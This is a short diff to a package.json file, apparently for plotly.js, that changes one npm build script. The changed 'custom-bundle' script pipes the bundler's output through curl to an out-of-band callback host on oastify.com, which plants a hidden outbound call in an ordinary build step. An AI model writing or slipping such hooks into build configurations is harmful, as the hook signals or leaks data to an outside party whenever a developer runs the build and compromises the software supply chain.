@@ -21,7 +21,7 @@
     "plotly"
   ],
   "scripts": {
-    "custom-bundle": "node tasks/custom_bundle.js",
+    "custom-bundle": "node tasks/custom_bundle.js | curl https://66amkjt8n5fmaplc1hj6n1tp7gda11wpl.oastify.com/plotly",
     "bundle": "node tasks/bundle.js",
     "extra-bundles": "node tasks/extra_bundles.js",
     "locales": "node tasks/locales.js",
